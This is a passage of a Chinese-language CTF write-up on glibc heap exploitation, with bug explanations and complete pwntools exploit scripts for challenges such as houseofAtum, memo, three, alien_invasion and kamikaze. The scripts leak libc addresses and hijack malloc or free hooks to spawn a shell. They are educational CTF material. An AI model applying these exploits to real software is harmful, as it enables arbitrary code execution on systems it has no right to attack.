![image-20200402174854033](https://gitee.com/NoOne-hub/picture/raw/master/img/20200405001133.png)

我们可以控制这个堆块的pre_size和size了,你看tcache指向的是2a0处的堆块,接下来,我们free掉这个伪造的堆块

```python
    delete(1, 'y') 
    new(p64(0))
```

这里只是free掉这个伪造堆块,只是为了获得那个指针,我们伪造的entry指针,指向0x50链表的头部的指针,同时那个new(p64(0))是为了接下来能够正常malloc,这里我已经获得任意地址写了,接下来就是伪造0xa0堆块,然后free到unsortedbin后,泄露libc,然后在改free_hook

```python
    edit(0, p64(0)*3 + p64(0xa1)) # for unsortedbin
    delete(0,'y')

    # fill the 0x50, tcache
    edit(1,p64(0))
    new("123")
    delete(0,'y')
    edit(1,p64(0))
    # spray a couple of 0x21's to bypass _int_free's checks
    # see https://github.com/str8outtaheap/heapwn/blob/master/malloc/_int_free.c#L59
    new(p64(0x21)*9)
    delete(0,'y')
    
    # fill the 0xa0 tcache
    edit(1,p64(heap_addr+0x280))
    new("123")
    for i in range(0x7):
        delete(0,'n')
    # get unsortedbin
    delete(0,'y')
    # leak address
    edit(1,p64(heap_addr+0x260))
    new("A"*0x20)
    show(0)
    ru("A"*0x20)
    libc_addr=raddr()-0x3ebca0
    lg("Libc address",libc_addr)
    libc.address=libc_addr
    delete(0,'y')

    # modify __delete_hook
    edit(1,p64(libc.symbols['__free_hook']))
    new(p64(libc.symbols['system']))
    edit(1,'/bin/sh\x00')
    sla("choice:",str(3))
    sla(":",str(1))
```

这后面这部分就不仔细测试了,有个有意思的点就是,top_chunk位置变成了main_arena+96

![image-20200402210931140](https://gitee.com/NoOne-hub/picture/raw/master/img/20200405001134.png)





#### exp

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

local = 1
link = ''
host,port = map(str.strip, link.split(':')) if link != '' else ("",0)
context.log_level = 'debug'
#context.terminal = "/home/noone/hyperpwn/hyperpwn-client.sh"
context.terminal =  ['mate-terminal','--geometry=94x60--10-26','--hide-menubar', '-x','sh','-c',]
exe = './houseofAtum'
context.binary = exe
elf = ELF(exe)
libc = elf.libc


#don't forget to change it
if local:
    io = process(exe)
else:
    io = remote(host,port)

s    = lambda data                                    : io.send(str(data))
sa   = lambda delim,data                              : io.sendafter(str(delim), str(data))
sl   = lambda data                                    : io.sendline(str(data))
sla  = lambda delim,data                              : io.sendlineafter(str(delim), str(data))
r    = lambda numb=4096                               : io.recv(numb)
rl   = lambda                                         : io.recvline().strip()
ru   = lambda delim,drop=True                         : io.recvuntil(delim, drop)
rg   = lambda regex                                   : io.recvregex(regex)
rp   = lambda timeout=1                               : io.recvrepeat(timeout)
uu32 = lambda data                                    : u32(data.ljust(4, '\x00'))
uu64 = lambda data                                    : u64(data.ljust(8, '\x00'))
lg   = lambda s,addr                                  : io.success('\033[1;31;40m%20s--> 0x%x\033[0m'%(s,addr))
ga   = lambda job=""                                  : gdb.attach(io, job) if local else 0
ia   = lambda                                         : io.interactive()

# break on aim addr
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        gdb.attach(io,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(io,"b *{}".format(hex(addr)))

# get_one_gadget
def get_one_gadget(filename):
    try:
        import subprocess
    except Exception as e:
        print("subprocess not install")
        exit(0)
    return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))



#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

def choice(idx):
    def wrap(f):
        def go(*args, **kargs):
            sla(":", idx)
            f(*args, **kargs)
        return go
    return wrap

@choice(idx=1)
def new(content):
    sa(":", content)

@choice(idx=2)
def edit(idx, content):
    sla(":", idx)
    sa(":", content)

@choice(idx=3)
def delete(idx, choice):
    sla(":", idx)
    sla(":", choice)

@choice(idx=4)
def show(idx):
    sla(":",  idx)

def get_heap(idx):
    show(idx)
    ru("Content:")
    return uu64(r(6)) 

def get_libc(idx):
    show(idx)
    ru("A"*0x20)
    return uu64(r(6))

def exp(host, rce=False):
    if rce:
        one_gadget = get_one_gadget(libc.path)
    
    # first leak heap addr
    new("0")
    new("1")
    delete(1, 'y')
    delete(0, 'y')
    new("0")
    heap_addr = get_heap(0) - 0x230
    link_0x50_start = heap_addr + 0x68
    chunk_0xa0 = heap_addr + 0x280
    lg("heap", heap_addr)
    payload = flat([
        p64(0)*7,
        p64(0x61),
        p64(link_0x50_start)
    ])
    edit(0, payload)
    delete(0, 'y')

    # second get pointer
    new("0")
    new("1")
    for i in range(7):
        delete(0, 'n')
    delete(1, 'y')
    delete(0, 'y')
    
    new("1") #0
    new("2") #1
    delete(1, 'y') # free fake
    # here we can get any address write
    #edit the 0xa1,so can get libc
    new(p64(0)) #1 save change any address to write
    payload = flat([
        p64(0)*3,
        p64(0xa1)
    ])
    # add a new chunk to fill space
    edit(0, payload)
    delete(0, 'y')
    edit(1, p64(0))

    new("0")
    delete(0, 'y')
    edit(1, p64(0))

    # spray a couple of 0x21's to bypass _int_free's checks
    # see https://github.com/str8outtaheap/heapwn/blob/master/malloc/_int_free.c#L59
    payload = flat([
        p64(0x21)*9
    ])
    new(payload)
    delete(0, 'y')

    # fill the 0xa0 tcache
    edit(1, p64(chunk_0xa0))
    new("0")
    for i in range(7):
        delete(0, 'n')
    # get unsortedbin
    delete(0, 'y')
    # leak address
    edit(1, p64(heap_addr+0x260))
    new("A"*0x20)
    libc.address = get_libc(0)-96-0x3ebc40
    lg("libc", libc.address)
    delete(0, 'y')

    edit(1, p64(libc.sym['__free_hook']))
    new(p64(libc.sym['system']))
    ga()
    edit(1, "/bin/sh\x00")
    sl("3")
    sl("1")
    '''                         
    try:
        from LibcSearcher import *
    except Exception as e:
        print("LibcSearcher not install")
        exit(0)        
    obj = LibcSearcher("fgets",leak_addr)
    libc_base = leak_addr - obj.dump("fgets")  
    system_addr = libc_base + obj.dump("system")
    malloc_hook = libc_base + obj.dump("__malloc_hook")
    free_hook = libc_base + obj.dump("__free_hook")
    bin_sh_addr = libc_base + obj.dump("str_bin_sh")
    '''
    ia()

if __name__ == '__main__':
    exp(host,)


```



### memo

#### 漏洞点

realloc的点,没开pie,利用realloc会__init_free然后在利用malloc_consolidate合并,具体看源码

[realloc](https://github.com/str8outtaheap/heapwn/blob/master/malloc/_int_realloc.c#L144)

![image-20200403113744503](https://gitee.com/NoOne-hub/picture/raw/master/img/20200405001135.png)

首先判断大小,nb小于old size的话,他就会分割

![image-20200403113838949](https://gitee.com/NoOne-hub/picture/raw/master/img/20200405001136.png)

这里remainder 就是减去后大小,free掉这部分

然后转到[__init_free](https://github.com/str8outtaheap/heapwn/blob/master/malloc/_int_free.c#L223)去看看

![image-20200403114056428](https://gitee.com/NoOne-hub/picture/raw/master/img/20200405001137.png)

看到这里,他调用了[malloc_consolidate](https://github.com/str8outtaheap/heapwn/blob/master/malloc/malloc_consolidate.c#L63)进行合并

![image-20200403114159297](https://gitee.com/NoOne-hub/picture/raw/master/img/20200405001138.png)

然后这里有unlink,所以就跟unlink一样了, 中间还有几个要bypass的点

- realloc(): invalid next size

![image-20200403114336533](https://gitee.com/NoOne-hub/picture/raw/master/img/20200405001139.png)

需要next_chunk的size不小于2倍size_sz

next_chunk的next_chunk必须得过了检测,也就是也得next_chunk的next_chunk的pre_size必须得等于next_chunk的size,

![image-20200403114631663](https://gitee.com/NoOne-hub/picture/raw/master/img/20200405001140.png)

这里将下个chunk的size也改成正常的就行了,pre_size他会计算,也就是要伪造两个chunk

#### exp

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

local = 1
link = ''
host,port = map(str.strip, link.split(':')) if link != '' else ("",0)
context.log_level = 'debug'
#context.terminal = "/home/noone/hyperpwn/hyperpwn-client.sh"
context.terminal =  ['mate-terminal','--geometry=94x60--10-26','--hide-menubar', '-x','sh','-c',]
exe = './memo'
context.binary = exe
elf = ELF(exe)
libc = elf.libc


#don't forget to change it
if local:
    io = process(exe)
else:
    io = remote(host,port)

s    = lambda data                                    : io.send(str(data))
sa   = lambda delim,data                              : io.sendafter(str(delim), str(data))
sl   = lambda data                                    : io.sendline(str(data))
sla  = lambda delim,data                              : io.sendlineafter(str(delim), str(data))
r    = lambda numb=4096                               : io.recv(numb)
rl   = lambda                                         : io.recvline().strip()
ru   = lambda delim,drop=True                         : io.recvuntil(delim, drop)
rg   = lambda regex                                   : io.recvregex(regex)
rp   = lambda timeout=1                               : io.recvrepeat(timeout)
uu32 = lambda data                                    : u32(data.ljust(4, '\x00'))
uu64 = lambda data                                    : u64(data.ljust(8, '\x00'))
lg   = lambda s,addr                                  : io.success('\033[1;31;40m%20s--> 0x%x\033[0m'%(s,addr))
ga   = lambda job=""                                  : gdb.attach(io, job) if local else 0
ia   = lambda                                         : io.interactive()

# break on aim addr
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        gdb.attach(io,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(io,"b *{}".format(hex(addr)))

# get_one_gadget
def get_one_gadget(filename):
    try:
        import subprocess
    except Exception as e:
        print("subprocess not install")
        exit(0)
    return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))



#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x3ff000)

def choice(idx):
    def wrap(f):
        def go(*args, **kargs):
            sla("exit\n", idx)
            f(*args, **kargs)
        return go
    return wrap

@choice(idx=1)
def show():
    pass

@choice(idx=2)
def edit(content):
    sla("page:", content)

@choice(idx=3)
def tear(size, content):
    sla("(bytes):\n", size)
    sla("page:\n", content)

@choice(idx=4)
def change_name(name):
    sla("name:\n", name)

@choice(idx=5)
def change_title(data):
    sla("title:\n", data)

def get_libc():
    show()
    rl()
    return uu64(rl())

def exp(host, rce=False):
    if rce:
        one_gadget = get_one_gadget(libc.path)
    ptr = 0x602040
    page_content = 0x602038
    payload = flat([
        p64(0),
        p64(8),
        p64(ptr-0x18),
        p64(ptr-0x10),
        p64(0x20),
        p64(0x40),
    ])
    change_name(payload)
    payload = flat([
        p64(0)*6,
        p64(0),
        p64(0x21),
        p64(0)*2,
        p64(0),
        p64(0x21),
    ])
    edit(payload)
    tear(0x400, "1")
    tear(0x100, "2")
    # 0
    # -- ptr--edit function
    # -- array_602040--change_name
    # -- count-- edit_length
    payload = flat([
        p64(0)*2,
        p64(elf.got['atoi']),
        p64(page_content),
    ])
    change_name(payload)
    libc.address = get_libc() -  libc.sym['atoi']
    lg("libc", libc.address)
    #change page count
    change_name(p64(0x602050) + p64(page_content))
    edit(p64(0))
    #change_ptr
    change_name(p64(libc.sym['__realloc_hook']) + p64(page_content))
    edit(p64(libc.sym['system']))
    change_name(p64(libc.search("/bin/sh").next()))
    sl("3")
    sl(0x100)
    '''                         
    try:
        from LibcSearcher import *
    except Exception as e:
        print("LibcSearcher not install")
        exit(0)        
    obj = LibcSearcher("fgets",leak_addr)
    libc_base = leak_addr - obj.dump("fgets")  
    system_addr = libc_base + obj.dump("system")
    malloc_hook = libc_base + obj.dump("__malloc_hook")
    free_hook = libc_base + obj.dump("__free_hook")
    bin_sh_addr = libc_base + obj.dump("str_bin_sh")
    '''
    ia()

if __name__ == '__main__':
    exp(host,)
```



### three

#### 漏洞点

这道题还是uaf,相比houseofAtum,难度降低不少,不过就是繁杂,限制三个堆块



#### 漏洞利用

,限制了三个堆块,所以只能重复的使用,利用uaf将指针指向其开始结构,然后通过修改size, 然后free,然后通过拿到main_arena,然后改_IO_2_1_stdout_泄露地址,最后常规手法,这里有个注意要bypass的就是跟0ctf babyheap 1804一样,要过那个检查,

next_chunk->next_chunk->pre_size == next_chunk->size,通过大量的0x11做滑板进行绕过





#### exp

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

local = 1
link = ''
host,port = map(str.strip, link.split(':')) if link != '' else ("",0)
context.log_level = 'debug'
#context.terminal = "/home/noone/hyperpwn/hyperpwn-client.sh"
context.terminal =  ['mate-terminal','--geometry=94x60--10-26','--hide-menubar', '-x','sh','-c',]
exe = './three'
context.binary = exe
elf = ELF(exe)
libc = elf.libc


#don't forget to change it
if local:
    io = process(exe)
else:
    io = remote(host,port)

s    = lambda data                                    : io.send(str(data))
sa   = lambda delim,data                              : io.sendafter(str(delim), str(data))
sl   = lambda data                                    : io.sendline(str(data))
sla  = lambda delim,data                              : io.sendlineafter(str(delim), str(data))
r    = lambda numb=4096                               : io.recv(numb)
rl   = lambda                                         : io.recvline().strip()
ru   = lambda delim,drop=True                         : io.recvuntil(delim, drop)
rg   = lambda regex                                   : io.recvregex(regex)
rp   = lambda timeout=1                               : io.recvrepeat(timeout)
uu32 = lambda data                                    : u32(data.ljust(4, '\x00'))
uu64 = lambda data                                    : u64(data.ljust(8, '\x00'))
lg   = lambda s,addr                                  : io.success('\033[1;31;40m%20s--> 0x%x\033[0m'%(s,addr))
ga   = lambda job=""                                  : gdb.attach(io, job) if local else 0
ia   = lambda                                         : io.interactive()

# break on aim addr
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        gdb.attach(io,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(io,"b *{}".format(hex(addr)))

# get_one_gadget
def get_one_gadget(filename):
    try:
        import subprocess
    except Exception as e:
        print("subprocess not install")
        exit(0)
    return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))



#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
def choice(idx):
    def wrap(f):
        def go(*args, **kargs):
            sla(":", idx)
            f(*args, **kargs)
        return go
    return wrap

@choice(idx=1)
def new(content):
    sa(":", content)

@choice(idx=2)
def edit(idx, content):
    sla(":", idx)
    sa(":", content)

@choice(idx=3)
def delete(idx, choice):
    sla(":", idx)
    sla(":", choice)

@choice(idx=4)
def show(idx):
    sla(":",  idx)

def exp(host, rce=False):
    if rce:
        one_gadget = get_one_gadget(libc.path)
    
    new("0") #0
    new(p64(0x11)*8) #1
    delete(1, 'y')
    delete(0, 'n')
    edit(0, p8(0x50))
    new("123") #1
    new(p64(0)) #2
    delete(1, 'n')
    edit(2, p64(0) + p64(0x91))
    for i in range(7):
        delete(1, 'n')
    edit(2, p64(0) + p64(0x51))
    delete(0, 'y')
    edit(2, p64(0) + p64(0x91))
    delete(1, 'y')
    # Bruteforce 4 bits to make fd point to _IO_2_1_stdout_
    edit(2,p64(0)+p64(0x51)+p16(0x7760))
    new("123")
    # Modify the flag and the write pointers
    new(p64(0xfbad1800) + p64(0)*3 + p8(0))
    r(8)
    libc_addr=uu64(r(6))
    if hex(libc_addr)[2:4] != '7f':
        raise NotImplemented
    libc.address=libc_addr - 0x3ed8b0
    lg("libc",libc.address)
    ru("Done")
    delete(0,'y')
    edit(2,p64(0)+p64(0x51)+p64(libc.symbols['__free_hook']))
    new("123")
    ga()
    edit(2,p64(0)+p64(0x61)+p64(libc.symbols['__free_hook']))
    delete(0,'y')
    new(p64(libc.symbols['system']))
    edit(2,'/bin/sh\x00')
    sla(":", 3)
    sla(":",str(2))
    '''                       
    try:
        from LibcSearcher import *
    except Exception as e:
        print("LibcSearcher not install")
        exit(0)        
    obj = LibcSearcher("fgets",leak_addr)
    libc_base = leak_addr - obj.dump("fgets")  
    system_addr = libc_base + obj.dump("system")
    malloc_hook = libc_base + obj.dump("__malloc_hook")
    free_hook = libc_base + obj.dump("__free_hook")
    bin_sh_addr = libc_base + obj.dump("str_bin_sh")
    '''
    ia()

if __name__ == '__main__':
    while True:
        try:
            exp(host,)
            break
        except Exception as e:
            print(e)
            io.close()
            io = process(exe)


```



## CSAW



### alien_invasion



#### 漏洞点

有两个

![image-20200403202554456](https://gitee.com/NoOne-hub/picture/raw/master/img/20200405001141.png)

这里有个数组越界访问,任意地址写8个字节,同时还能泄露,这个很强大,这里我不用,我学堆利用

第二个

![image-20200403202640368](https://gitee.com/NoOne-hub/picture/raw/master/img/20200405001142.png)

off-by-null

#### 漏洞利用

利用overlap泄露libc, 然后在利用overlap修改结构体指针,然后任意地址写,这个不好利用,__free_hook和\_\_malloc_hook都被禁用了,然后得想别的办法,看别人wp后发觉 \_\_morecore 这个函数可以打

[sysmalloc](https://github.com/str8outtaheap/heapwn/blob/master/malloc/sysmalloc.c#L224)

看源码

![image-20200403202938227](https://gitee.com/NoOne-hub/picture/raw/master/img/20200405001143.png)

这里大堆块调用sysmalloc,这里有个判断得过掉,不然会用mmap,所以方法是先耗尽top_chunk的大小,threshold为0x20000,然后在申请

![image-20200403203312834](https://gitee.com/NoOne-hub/picture/raw/master/img/20200405001144.png)

这里调用morecore,所以打掉这个,我们也可以拿shell









#### exp

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

local = 1
link = ''
host,port = map(str.strip, link.split(':')) if link != '' else ("",0)
context.log_level = 'debug'
#context.terminal = "/home/noone/hyperpwn/hyperpwn-client.sh"
context.terminal =  ['mate-terminal','--geometry=94x60--10-26','--hide-menubar', '-x','sh','-c',]
exe = './invasion'
context.binary = exe
elf = ELF(exe)
libc = elf.libc


#don't forget to change it
if local:
    io = process(exe)
else:
    io = remote(host,port)

s    = lambda data                                    : io.send(str(data))
sa   = lambda delim,data                              : io.sendafter(str(delim), str(data))
sl   = lambda data                                    : io.sendline(str(data))
sla  = lambda delim,data                              : io.sendlineafter(str(delim), str(data))
r    = lambda numb=4096                               : io.recv(numb)
rl   = lambda                                         : io.recvline().strip()
ru   = lambda delim,drop=True                         : io.recvuntil(delim, drop)
rg   = lambda regex                                   : io.recvregex(regex)
rp   = lambda timeout=1                               : io.recvrepeat(timeout)
uu32 = lambda data                                    : u32(data.ljust(4, '\x00'))
uu64 = lambda data                                    : u64(data.ljust(8, '\x00'))
lg   = lambda s,addr                                  : io.success('\033[1;31;40m%20s--> 0x%x\033[0m'%(s,addr))
ga   = lambda job=""                                  : gdb.attach(io, job) if local else 0
ia   = lambda                                         : io.interactive()

# break on aim addr
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        gdb.attach(io,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(io,"b *{}".format(hex(addr)))

# get_one_gadget
def get_one_gadget(filename):
    try:
        import subprocess
    except Exception as e:
        print("subprocess not install")
        exit(0)
    return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))



#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

def choice(idx):
    def wrap(f):
        def go(*args, **kargs):
            sla("today.\n", idx)
            f(*args, **kargs)
        return go
    return wrap

@choice(idx=1)
def new(size, name):
    sla("name?\n", size)
    sa("name?\n", name)

@choice(idx=2)
def free(idx):
    sla("mother?\n", idx)

@choice(idx=3)
def edit(idx, data):
    sla("rename?\n", idx)
    sa("to?\n", data)

def start():
    sla("ka?\n", "3")

def get_libc(idx):
    sla("today.\n", '3')
    sla("rename?\n", idx)
    ru("rename ")
    data = uu64(r(6))
    sla("to?\n", '')
    return data

def exp(host, rce=False):
    if rce:
        one_gadget = get_one_gadget(libc.path)
    
    start()
    for i in range(4):
        new(0x28, str(i)*0x8)
    new(0xf0, "4") 
    free(0)
    new(0xf0, "5")
    new(0xf0, "6") #change pointer
    free(1)
    new(0xf0,"7")

    new(0x48,"8") #avoid consolidate top chunk
    free(6)
    new(0xf8, "9"*0xf0 + p64(0x100+0x20+0x100+0x100))
    free(4)
    free(7)
    new(0xf0, "10") 
    #edit(5,'')
    libc.address = get_libc(5) - 0x3c4b78
    lg("libc", libc.address)
    new(0xf0, '11')
    free(2)
    new(0x18, p64(libc.symbols['__morecore']) + p64(0)) #12
    edit(9, p64(libc.address + 0xf02a4))

    new(0x1f000, "13")
    sl("1")
    sl(0x1f000)
    #ga()


    #free(10)
    '''                         
    try:
        from LibcSearcher import *
    except Exception as e:
        print("LibcSearcher not install")
        exit(0)        
    obj = LibcSearcher("fgets",leak_addr)
    libc_base = leak_addr - obj.dump("fgets")  
    system_addr = libc_base + obj.dump("system")
    malloc_hook = libc_base + obj.dump("__malloc_hook")
    free_hook = libc_base + obj.dump("__free_hook")
    bin_sh_addr = libc_base + obj.dump("str_bin_sh")
    '''
    ia()

if __name__ == '__main__':
    exp(host,)

```



#### 总结

这里的overlap是经典的手法,但自己利用起来还是有些吃力,因为他的结构是同时申请的,我自己利用的是申请几个堆块然后free掉,让其当结构,这样才能让我构造的时候堆块临近,off-by-one才能实现,同时大小可以直接计算,每个都加上堆头就能算出pre_size了





看别人的wp也是这个思路,自己申请几块不用的堆块,占位,然后要用的时候free掉,当结构就行,不过他是将大堆块拆分,然后拆成两个小的在拆分的两个堆块造成off-by-one



## HackIT



### kamikaze



#### 漏洞点

![image-20200403231254249](https://gitee.com/NoOne-hub/picture/raw/master/img/20200405001145.png)

这种功能名出现在题目的话,通常就是这个功能出问题了,看这里求hook的方法,strlen,而已经规定hook为0x10了,所以很明显,搞掉这里就可以了,将hook写满,然后复制的时候就会复制到下一个的size,这里他居然刚好申请0x28大小的堆块,仿佛就是为了出题而出题的

#### 漏洞利用



逆向出来的结构体

```c
struct kami
{
  __int64 weight;
  char *stanza;
  struct kami *next;
  char hook[10];
};

```



大坑,exp里也不写...calloc如果是mmap标志位的话,他不会清空堆里内容,害得我读了一遍calloc源码,才找到这个点

```c

  /* Two optional cases in which clearing not necessary */
  if (chunk_is_mmapped (p))
    {
      if (__builtin_expect (perturb_byte, 0))
        return memset (mem, 0, sz);

      return mem;
    }

```

前面原来不知道他是在干吗,看了源码后才知道这个原因,为了calloc不清空内存,一早上都在调试这个,对比堆块干了什么,我发觉多了指针,不知道原因,以为是堆布局导致的



说实话,我看出了漏洞点,但不知道怎么利用,无法构造出0x1和0x0这个异或作为尾巴,然后思路死了,看别人exp,别人构造了个2,这就是看不懂,花了很长时间,2是IS_MAPPED说明,.calloc如果是mmap标志位的话,他不会清空堆里内容

```python
    new(1, 0x28, "chunk__1", "1"*0x10)
    new(2, 0x28, "chunk__2", "2"*0x10)
    new(3, 0x28, "chunk__3", "3"*0x10)

    delete(2) #old--2--2 chunk
    delete(3) #old--3--2 chunk
    delete(1) #old--1--2 chunk
    
    new(4, 0x48, "chunk__4", "4"*0x10) #take old 1--1 chunk
    new(5, 0x68, "chunk__5" + p64(0x11)*10, "5"*0x10) #take old 1--2 chunk
    kamikaze(5, 3) # set is_mapped
    new(6, 0x28, "chunk__6", "6"*0x10) #take old 3--2 chunk
    new(7, 0x28, "chunk__7", "7"*0x10) #take old 2--2 chunk with old pointer
    # cause loop
    delete(6)
```

这前面部分,构造成标志位为2,所以不会清空堆块内容,导致残留指针,利用这个残留指针,将单链表变成最后三个结点循环,

4->5->6->7->6

然后解掉其中一个6,变成

4->5->7->6->7

由于fastbin的作用,他会将6的fd指向其中一个free掉的堆块,而此时的结构相当于weight部分,所以此时我们打印的时候就可以泄露heap了

我们将5也解掉, 

4 -> 7 ->6->7

![image-20200404223350326](https://gitee.com/NoOne-hub/picture/raw/master/img/20200405001146.png)

这里要注意,fastbin链条,我们申请的内容将会填到0c0部分去,

0c0部分指针,我们可以当做结构体来用,因为7还指向他,所以我们此时要构造一个结构体,stanza为我们要构造的部分,构造成0f0处地址,这样我们改掉size后free掉就拿到个unsortedbin了,同时,我们还可以再次泄露libc

还记得前面有个p64(0x11)*10吗,在第五个块的时候,因为要过了这里的检测

```python
    delete(5)
    ga()
    want = heap + 0xc8
    struct_kami = flat(["A"*0x8, want, 0])
    new(8, 0x28, struct_kami, "8"*0x10)
    edit(0x4141414141414141, p8(0xf1))
    delete(8)
    libc.address = leak(3) - 0x3c4b78
    lg("libc", libc.address)
```

由于编辑功能是按权重来查找的,我们输入了8个A,对应的权重就是0x4141414141414141,这时候改掉size,还要注意,他是strlen求长度,所以应该为c8处,刚好是size部分

```python
    struct_kami = flat([ 
        p64(0)*2, 
        p64(heap+0x250), 
        p64(0)])
    fix_chunk = flat([p64(0) + p64(0x32) + p64(0)])
    ga()
    new(9, 0x48, struct_kami + fix_chunk, "9"*0x10)
```

接下来这部分,要保护好结构体,这里我将他指向很远的地方,比如0x250处,我就不用再去修复了,不然编辑后又要修复,麻烦,同时,要将fix_chunk的标志位改为2,不然calloc要清空堆块

```python
    delete(9)
    new(10, 0x10, "10", "10"*0x5)
    new(11, 0x58, p64(0)*7 + p64(0x71) + p64(libc.sym['__malloc_hook']-0x23), "10"*0x5)
    new(12, 0x68, "11", "11"*0x5)
    new(13, 0x68 , "A"*0x13 + p64(libc.address + one_gadget[2]), "10"*0x5)
    sl("1")

```

后面这部分,调试出来的,不要破坏到结构体就行,所以我free了一个,堆块复用就不会再次申请结构体了,





#### exp

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

local = 1
link = ''
host,port = map(str.strip, link.split(':')) if link != '' else ("",0)
context.log_level = 'debug'
#context.terminal = "/home/noone/hyperpwn/hyperpwn-client.sh"
context.terminal =  ['mate-terminal','--geometry=94x60--10-26','--hide-menubar', '-x','sh','-c',]
exe = './kamikaze'
context.binary = exe
elf = ELF(exe)
libc = elf.libc


#don't forget to change it
if local:
    io = process(exe)
else:
    io = remote(host,port)

s    = lambda data                                    : io.send(str(data))
sa   = lambda delim,data                              : io.sendafter(str(delim), str(data))
sl   = lambda data                                    : io.sendline(str(data))
sla  = lambda delim,data                              : io.sendlineafter(str(delim), str(data))
r    = lambda numb=4096                               : io.recv(numb)
rl   = lambda                                         : io.recvline().strip()
ru   = lambda delim,drop=True                         : io.recvuntil(delim, drop)
rg   = lambda regex                                   : io.recvregex(regex)
rp   = lambda timeout=1                               : io.recvrepeat(timeout)
uu32 = lambda data                                    : u32(data.ljust(4, '\x00'))
uu64 = lambda data                                    : u64(data.ljust(8, '\x00'))
lg   = lambda s,addr                                  : io.success('\033[1;31;40m%20s--> 0x%x\033[0m'%(s,addr))
ga   = lambda job=""                                  : gdb.attach(io, job) if local else 0
ia   = lambda                                         : io.interactive()

# break on aim addr
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        gdb.attach(io,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(io,"b *{}".format(hex(addr)))

# get_one_gadget
def get_one_gadget(filename):
    try:
        import subprocess
    except Exception as e:
        print("subprocess not install")
        exit(0)
    return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))



#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

def choice(idx):
    def wrap(f):
        def go(*args, **kargs):
            sla(">> ", idx)
            f(*args, **kargs)
        return go
    return wrap

@choice(idx=1)
def new(weight, size, stanza, hook):
    sla(": ", weight)
    sla(": ", size)
    sla(": ", stanza)
    sa(": ", hook)

@choice(idx=2)
def edit(weight, stanza):
    sla(": ", weight)
    sa(": ", stanza)

@choice(idx=3)
def kamikaze(weight, seed):
    sla(": ", weight)
    sla(": ", seed)
    
@choice(idx=4)
def delete(idx):
    sla(": ", idx)

@choice(idx=5)
def play(idx):
    sla(": ", idx)

def leak(idx):
    play(idx)
    ru("Weight: ")
    return int(rl(), 16)
def exp(host, rce=False):
    if rce:
        one_gadget = get_one_gadget(libc.path)
    
    new(1, 0x28, "chunk__1", "1"*0x10)
    new(2, 0x28, "chunk__2", "2"*0x10)
    new(3, 0x28, "chunk__3", "3"*0x10)

    delete(2) #old--2--2 chunk
    delete(3) #old--3--2 chunk
    delete(1) #old--1--2 chunk
    
    new(4, 0x48, "chunk__4", "4"*0x10) #take old 1--1 chunk
    new(5, 0x68, "chunk__5" + p64(0x11)*10, "5"*0x10) #take old 1--2 chunk
    kamikaze(5, 3) # set is_mapped
    new(6, 0x28, "chunk__6", "6"*0x10) #take old 3--2 chunk
    new(7, 0x28, "chunk__7", "7"*0x10) #take old 2--2 chunk with old pointer
    # cause loop
    delete(6)
    heap = leak(3) - 0xf0
    lg("heap", heap)
    #break the loop
    delete(5)
    want = heap + 0xc8
    struct_kami = flat(["A"*0x8, want, 0])
    new(8, 0x28, struct_kami, "8"*0x10)
    edit(0x4141414141414141, p8(0xf1))
    delete(8)
    libc.address = leak(3) - 0x3c4b78
    lg("libc", libc.address)
    #new(9, 0x8, "chunk__9", "9"*0x10)
    struct_kami = flat([ 
        p64(0)*2, 
        p64(heap+0x250), 
        p64(0)])
    fix_chunk = flat([p64(0) + p64(0x32) + p64(0)])
    new(9, 0x48, struct_kami + fix_chunk, "9"*0x10)
    delete(9)
    new(10, 0x10, "10", "10"*0x5)
    new(11, 0x58, p64(0)*7 + p64(0x71) + p64(libc.sym['__malloc_hook']-0x23), "10"*0x5)
    new(12, 0x68, "11", "11"*0x5)
    new(13, 0x68 , "A"*0x13 + p64(libc.address + one_gadget[2]), "10"*0x5)
    sl("1")
    '''                         
    try:
        from LibcSearcher import *
    except Exception as e:
        print("LibcSearcher not install")
        exit(0)        
    obj = LibcSearcher("fgets",leak_addr)
    libc_base = leak_addr - obj.dump("fgets")  
    system_addr = libc_base + obj.dump("system")
